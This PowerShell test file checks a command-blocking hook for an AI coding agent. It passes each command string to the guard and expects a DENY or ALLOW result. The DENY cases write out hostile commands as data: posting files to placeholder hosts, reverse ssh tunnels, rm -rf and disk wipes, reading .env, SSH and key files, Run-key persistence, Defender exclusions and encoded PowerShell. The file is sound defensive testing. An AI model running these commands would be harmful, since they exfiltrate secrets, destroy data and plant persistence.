# cc-guard-test.ps1 - v3.4
# Every case pipes a command string into cc-guard.ps1. Nothing is executed.
# The DENY / ALLOW totals are counted and printed by the script.
#
# Run:  powershell -ExecutionPolicy Bypass -File cc-guard-test.ps1
# Pass: "ALL <n> CASES PASS"
#
# The script forces enforce mode, sends the log to a temp file, points the
# allow file at a path that does not exist, and sets CC_GUARD_DENY_EXTRA per
# case, so your real log, allow file and env do not change the result.

$Guard = Join-Path $PSScriptRoot 'cc-guard.ps1'
if (-not (Test-Path $Guard)) { Write-Host "cc-guard.ps1 not found next to this script" -ForegroundColor Red; exit 1 }

$env:CC_GUARD_MODE  = 'enforce'
$env:CC_GUARD_LOG   = Join-Path ([IO.Path]::GetTempPath()) 'cc-guard-test.log'
$env:CC_GUARD_ALLOW = Join-Path ([IO.Path]::GetTempPath()) 'cc-guard-test-no-allow-file.txt'

$Cases = @(
  # ================= must DENY: known bypasses of a prefix deny list =================
  @{ n='python requests';      t='Bash';       c='python -c "import requests; requests.post(\"https://x.tld\", data=open(\"a\").read())"'; e='DENY' }
  @{ n='python urllib';        t='Bash';       c='python3 -c "import urllib.request; urllib.request.urlopen(\"https://x.tld\")"'; e='DENY' }
  @{ n='python from socket';   t='Bash';       c='python -c "from socket import socket"'; e='DENY' }
  @{ n='python subprocess';    t='Bash';       c='python -c "import subprocess; subprocess.run([\"curl\",\"https://x.tld\"])"'; e='DENY' }
  @{ n='node fetch';           t='Bash';       c='node -e "fetch(\"https://x.tld\")"'; e='DENY' }
  @{ n='node https.request';   t='Bash';       c='node -e "require(\"https\").request(\"https://x.tld\")"'; e='DENY' }
  @{ n='Invoke-WebRequest';    t='PowerShell'; c='Invoke-WebRequest -Uri https://x.tld -OutFile a.txt'; e='DENY' }
  @{ n='iwr alias';            t='PowerShell'; c='iwr https://x.tld'; e='DENY' }
  @{ n='Invoke-RestMethod';    t='PowerShell'; c='$r = Invoke-RestMethod https://api.x.tld'; e='DENY' }
  @{ n='WebClient';            t='PowerShell'; c='(New-Object System.Net.WebClient).DownloadString("https://x.tld")'; e='DENY' }
  @{ n='curl prefix';          t='Bash';       c='curl https://x.tld -d @data.txt'; e='DENY' }
  @{ n='curl in pipeline';     t='Bash';       c='cat f | curl -X POST https://x.tld --data-binary @-'; e='DENY' }
  @{ n='curl in $( )';         t='Bash';       c='echo $(curl -s https://x.tld)'; e='DENY' }
  @{ n='ssh tunnel';           t='Bash';       c='ssh -R 8080:localhost:22 user@host'; e='DENY' }
  @{ n='scp out';              t='Bash';       c='scp backup.tar.gz user@host:/tmp/'; e='DENY' }
  @{ n='ngrok';                t='Bash';       c='ngrok http 3000'; e='DENY' }
  @{ n='Remove-Item -LiteralPath -Recurse'; t='PowerShell'; c='Remove-Item -LiteralPath C:\tmp -Recurse'; e='DENY' }
  @{ n='Remove-Item -Force';   t='PowerShell'; c='Remove-Item C:\tmp\x -Force'; e='DENY' }
  @{ n='del /s';               t='Bash';       c='del /s /q C:\tmp'; e='DENY' }
  @{ n='rm -rf absolute';      t='Bash';       c='rm -rf /c/Users/user/tmp'; e='DENY' }
  @{ n='rm -rf after &&';      t='Bash';       c='cd /tmp/build && rm -rf .'; e='DENY' }
  @{ n='sudo rm -rf';          t='Bash';       c='sudo rm -rf /var/lib/x'; e='DENY' }
  @{ n='diskpart';             t='PowerShell'; c='diskpart /s wipe.txt'; e='DENY' }
  @{ n='git push --force';     t='Bash';       c='git push --force origin main'; e='DENY' }
  @{ n='git push --force-with-lease'; t='Bash'; c='git push --force-with-lease origin main'; e='DENY' }
  @{ n='git reset --hard';     t='Bash';       c='git reset --hard HEAD~5'; e='DENY' }
  @{ n='read .env';            t='Bash';       c='cat ./project/.env'; e='DENY' }
  @{ n='read .env.local';      t='Bash';       c='cat .env.local'; e='DENY' }
  @{ n='read id_rsa';          t='Bash';       c='cat ~/.ssh/id_rsa'; e='DENY' }
  @{ n='read .npmrc';          t='Bash';       c='cat ~/.npmrc'; e='DENY' }
  @{ n='read *.pem';           t='Bash';       c='cat ./certs/server.pem'; e='DENY' }
  @{ n='read *.key';           t='PowerShell'; c='Get-Content C:\certs\server.key'; e='DENY' }
  @{ n='read credentials.json';t='Bash';       c='cat ./config/credentials.json'; e='DENY' }
  @{ n='read credentials-prod';t='Bash';       c='cat credentials-prod.yaml'; e='DENY' }
  @{ n='enumerate secrets';    t='Bash';       c='rg -l token ./src'; e='DENY' }
  @{ n='schtasks persist';     t='PowerShell'; c='schtasks /create /tn x /tr y /sc onlogon'; e='DENY' }
  @{ n='reg add run key';      t='PowerShell'; c='reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d y'; e='DENY' }
  @{ n='defender exclusion';   t='PowerShell'; c='Add-MpPreference -ExclusionPath C:\'; e='DENY' }
  @{ n='set-executionpolicy';  t='PowerShell'; c='Set-ExecutionPolicy Bypass -Scope LocalMachine -Force'; e='DENY' }
  @{ n='history wipe';         t='Bash';       c='Clear-History'; e='DENY' }
  @{ n='encoded command';      t='PowerShell'; c='powershell -EncodedCommand SQBFAFgA'; e='DENY' }
  @{ n='encoded command short';t='PowerShell'; c='powershell -enc SQBFAFgA'; e='DENY' }
  @{ n='FromBase64String';     t='PowerShell'; c='[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("SQBFAFgA"))'; e='DENY' }
  @{ n='kill vmmem';           t='PowerShell'; c='Stop-Process -Name vmmem -Force'; e='DENY' }

  # ===== v3 additions: wrapper bypasses that v2 let through =====
  @{ n='v3: timeout 30 curl';  t='Bash';       c='timeout 30 curl https://x.tld'; e='DENY' }
  @{ n='v3: env curl';         t='Bash';       c='env curl https://x.tld'; e='DENY' }
  @{ n='v3: bash -c curl';     t='Bash';       c='bash -c "curl https://x.tld"'; e='DENY' }
  @{ n='v3: xargs rm -rf';     t='Bash';       c='ls | xargs rm -rf'; e='DENY' }
  @{ n='v3: find -exec rm -rf';t='Bash';       c='find . -name x -exec rm -rf {} +'; e='DENY' }

  # ================= must ALLOW: normal DevOps work =================
  @{ n='git status';           t='Bash';       c='git status --short'; e='ALLOW' }
  @{ n='git push (no force)';  t='Bash';       c='git push origin main'; e='ALLOW' }
  @{ n='git clone';            t='Bash';       c='git clone https://github.com/example/repo'; e='ALLOW' }
  @{ n='git log';              t='Bash';       c='git log --oneline -5'; e='ALLOW' }
  @{ n='git rm cached';        t='Bash';       c='git rm -r --cached node_modules'; e='ALLOW' }
  @{ n='npm install';          t='Bash';       c='npm install'; e='ALLOW' }
  @{ n='npm ci';               t='Bash';       c='npm ci'; e='ALLOW' }
  @{ n='npm test';             t='Bash';       c='npm test -- --reporter spec'; e='ALLOW' }
  @{ n='terraform plan';       t='Bash';       c='terraform plan -out=tfplan'; e='ALLOW' }
  @{ n='kubectl get';          t='Bash';       c='kubectl get pods -A'; e='ALLOW' }
  @{ n='helm upgrade';         t='Bash';       c='helm upgrade --install app ./chart'; e='ALLOW' }
  @{ n='docker ps';            t='Bash';       c='docker ps --format json'; e='ALLOW' }
  @{ n='docker compose up';    t='Bash';       c='docker compose up -d'; e='ALLOW' }
  @{ n='docker rm -f';         t='Bash';       c='docker rm -f mycontainer'; e='ALLOW' }
  @{ n='docker rmi';           t='Bash';       c='docker rmi old-image:latest'; e='ALLOW' }
  @{ n='kubectl delete pod';   t='Bash';       c='kubectl delete pod mypod'; e='ALLOW' }
  @{ n='ls';                   t='Bash';       c='ls -la ~/.claude'; e='ALLOW' }
  @{ n='Get-ChildItem';        t='PowerShell'; c='Get-ChildItem C:\projects -Directory'; e='ALLOW' }
  @{ n='Remove-Item one file'; t='PowerShell'; c='Remove-Item C:\tmp\one.txt'; e='ALLOW' }
  @{ n='python script';        t='Bash';       c='python3 analyze.py --input data.csv'; e='ALLOW' }
  @{ n='node script';          t='Bash';       c='node server.js'; e='ALLOW' }
  @{ n='claude plugin';        t='Bash';       c='claude plugin list'; e='ALLOW' }
  @{ n='wc';                   t='Bash';       c='wc -l ~/.claude/CLAUDE.md'; e='ALLOW' }

  # ================= FP regressions (v2 fixes + siblings) =================
  @{ n='FP: python -m pip install requests'; t='Bash'; c='python -m pip install requests'; e='ALLOW' }
  @{ n='FP: pip install -r';   t='Bash';       c='pip install -r requirements.txt'; e='ALLOW' }
  @{ n='FP: pip install pycurl';t='Bash';      c='pip install pycurl'; e='ALLOW' }
  @{ n='FP: python -m venv';   t='Bash';       c='python -m venv .venv'; e='ALLOW' }
  @{ n='FP: -Encoding utf8';   t='PowerShell'; c='Get-Content x.json -Raw | ConvertFrom-Json | ConvertTo-Json | Out-File out.json -Encoding utf8'; e='ALLOW' }
  @{ n='FP: -Encoding in claude -p'; t='PowerShell'; c='claude -p "hi" | Out-File log.txt -Encoding utf8'; e='ALLOW' }
  @{ n='FP: process.env';      t='Bash';       c='node -e "console.log(process.env.PATH)"'; e='ALLOW' }
  @{ n='FP: settings.env path';t='Bash';       c='cat ./config/settings.env'; e='ALLOW' }
  @{ n='FP: base64 -w0';       t='Bash';       c='base64 -w0 file.bin > out.txt'; e='ALLOW' }
  @{ n='FP: python json';      t='Bash';       c='python -c "import json; print(json.dumps({}))"'; e='ALLOW' }
  @{ n='FP: python csv';       t='Bash';       c='python3 -c "import csv,sys; print(sum(1 for _ in open(sys.argv[1])))" data.csv'; e='ALLOW' }
  @{ n='FP: git diff --stat';  t='Bash';       c='git diff --stat'; e='ALLOW' }
  @{ n='FP: npm run build';    t='Bash';       c='npm run build --if-present'; e='ALLOW' }
  @{ n='FP: node --version';   t='Bash';       c='node --version'; e='ALLOW' }
  @{ n='FP: pip list';         t='Bash';       c='pip list --format json'; e='ALLOW' }
  @{ n='FP: .keys is not .key';t='Bash';       c='cat config/api.keys.example'; e='ALLOW' }

  # ===== v3.1/v3.2 additions: path / .exe / long flags / git-scoped exclusion =====
  @{ n='v3.2: curl.exe -s';     t='PowerShell'; c='curl.exe -s https://x.tld'; e='DENY' }
  @{ n='v3.2: & full curl.exe'; t='PowerShell'; c='& "C:\Windows\System32\curl.exe" https://x.tld'; e='DENY' }
  @{ n='v3.2: /usr/bin/curl';   t='Bash';       c='/usr/bin/curl https://x.tld'; e='DENY' }
  @{ n='v3.2: mingw curl.exe';  t='Bash';       c='/mingw64/bin/curl.exe https://x.tld'; e='DENY' }
  @{ n='v3.2: wget.exe';        t='Bash';       c='wget.exe https://x.tld'; e='DENY' }
  @{ n='v3.2: /bin/rm -rf';     t='Bash';       c='/bin/rm -rf /c/Users/user/x'; e='DENY' }
  @{ n='v3.2: rm long flags';   t='Bash';       c='rm --recursive --force /c/Users/user/x'; e='DENY' }
  @{ n='v3.2: quoted rm';       t='Bash';       c='"rm" -rf /c/x'; e='DENY' }
  @{ n='v3.2: git && rm';       t='Bash';       c='git status && rm -rf /c/x'; e='DENY' }
  @{ n='v3.2: git; rm';         t='Bash';       c='git log; rm -rf /c/x'; e='DENY' }
  @{ n='v3.2: find .git rm';    t='Bash';       c='find /c/Users -name .git -exec rm -rf {} +'; e='DENY' }
  @{ n='v3.2: env X=git rm';    t='Bash';       c='env X=git rm -rf /c/x'; e='DENY' }
  @{ n='v3.2: curl localhost';  t='Bash';       c='curl localhost:3000'; e='DENY' }
  @{ n='v3.2: curl domain';     t='Bash';       c='curl example.com'; e='DENY' }
  @{ n='v3.2: curl $URL';       t='Bash';       c='curl $URL'; e='DENY' }
  @{ n='v3.2: scp user@host';   t='Bash';       c='scp a.txt user@host:/tmp/'; e='DENY' }
  @{ n='v3.2: git -C rm';       t='Bash';       c='git -C /c/repo rm -rf .'; e='ALLOW' }
  @{ n='v3.2: git -c rm cached';t='Bash';       c='git -c core.x=y rm -r --cached a'; e='ALLOW' }
  @{ n='v3.2: commit curl';     t='Bash';       c='git commit -m "fix curl timeout"'; e='ALLOW' }
  @{ n='v3.2: commit wget';     t='Bash';       c='git commit -m "handle wget errors in the fetch script"'; e='ALLOW' }
  @{ n='v3.2: rm -i';           t='Bash';       c='rm -i file.txt'; e='ALLOW' }
  @{ n='v3.2: npm run rm-cache';t='Bash';       c='npm run rm-cache'; e='ALLOW' }

  # ===== v3.3: false positives from the warn log + guards around the fix =====
  @{ n='v3.3 FP: rm -f temp file';   t='Bash'; c='cd ~/work && tool export > m.txt; rm -f m.txt'; e='ALLOW' }
  @{ n='v3.3 FP: rm -f lock';        t='Bash'; c='rm -f /tmp/app/browser.lock; tool send --file reply.md'; e='ALLOW' }
  @{ n='v3.3 FP: rm -f two files';   t='Bash'; c='cat m2.txt; rm -f m.txt m2.txt'; e='ALLOW' }
  @{ n='v3.3: rm -fr';               t='Bash'; c='rm -fr /c/Users/user/x'; e='DENY' }
  @{ n='v3.3: rm -Rf';               t='Bash'; c='rm -Rf build'; e='DENY' }
  @{ n='v3.3: rm -f -r';             t='Bash'; c='rm -f -r /c/x'; e='DENY' }
  @{ n='v3.3: rm -r only';           t='Bash'; c='rm -r build'; e='DENY' }
  @{ n='v3.3: rm scratch dir';       t='Bash'; c='cd scratch && rm -rf x && unzip -o -q v13.zip -d x'; e='DENY' }
  @{ n='v3.3: rm -f glob';           t='Bash'; c='rm -f /c/Users/user/*'; e='DENY' }
  @{ n='v3.3: rm --force glob';      t='Bash'; c='rm --force *.json'; e='DENY' }
  @{ n='v3.3: xargs rm -f';          t='Bash'; c='find . -name "*.log" | xargs rm -f'; e='DENY' }
  @{ n='v3.3: find -exec rm -f';     t='Bash'; c='find /c/Users/user -type f -exec rm -f {} +'; e='DENY' }
  @{ n='v3.3: grep secret';          t='Bash'; c='grep -rni secret ./src'; e='DENY' }
  @{ n='v3.3: grep secrets-x';       t='Bash'; c='grep -rl secrets ./src'; e='DENY' }

  # ===== v3.4: site-specific names come only from CC_GUARD_DENY_EXTRA =====
  @{ n='v3.4: extra name, env unset';     t='PowerShell'; c='Get-Content C:\data\private-notes\plan.txt'; e='ALLOW' }
  @{ n='v3.4: extra name, env set';       t='PowerShell'; c='Get-Content C:\data\private-notes\plan.txt'; e='DENY'; x='private-notes' }
  @{ n='v3.4: extra list, 2nd entry hits';t='Bash';       c='cat /d/team-keys/deploy.txt'; e='DENY'; x='private-notes, team-keys' }
  @{ n='v3.4: extra is case-insensitive'; t='Bash';       c='ls /d/Team-Keys'; e='DENY'; x='team-keys' }
  @{ n='v3.4: extra is literal, not regex';t='Bash';      c='cat /d/teamXkeys/a.txt'; e='ALLOW'; x='team.keys' }
  @{ n='v3.4: empty entries ignored';     t='Bash';       c='git status --short'; e='ALLOW'; x=' , ,' }
)

$pass = 0; $fail = 0
$rows = @()
foreach ($c in $Cases) {
  if ($c.x) { $env:CC_GUARD_DENY_EXTRA = $c.x } else { Remove-Item Env:CC_GUARD_DENY_EXTRA -ErrorAction SilentlyContinue }
  $json = @{ hook_event_name='PreToolUse'; tool_name=$c.t; tool_input=@{ command=$c.c }; cwd='C:\' } | ConvertTo-Json -Compress -Depth 6
  $null = $json | powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Guard 2>&1 3>&1
  $code = $LASTEXITCODE
  $got = if ($code -eq 2) { 'DENY' } else { 'ALLOW' }
  $ok = ($got -eq $c.e)
  if ($ok) { $pass++ } else { $fail++ }
  $rows += [pscustomobject]@{ Result = $(if($ok){'PASS'}else{'FAIL'}); Expected=$c.e; Got=$got; Case=$c.n; Cmd=$c.c }
}
Remove-Item Env:CC_GUARD_DENY_EXTRA -ErrorAction SilentlyContinue

$nDeny  = @($Cases | Where-Object { $_.e -eq 'DENY' }).Count
$nAllow = @($Cases | Where-Object { $_.e -eq 'ALLOW' }).Count

$rows | Where-Object { $_.Result -eq 'FAIL' } | Format-List
Write-Host ""
Write-Host "$($Cases.Count) cases: $nDeny must-DENY, $nAllow must-ALLOW"
if ($fail -eq 0) {
  Write-Host "ALL $pass CASES PASS" -ForegroundColor Green
} else {
  Write-Host "$pass passed, $fail FAILED" -ForegroundColor Red
  Write-Host "Do NOT switch to enforce until every case passes." -ForegroundColor Yellow
  exit 1
}
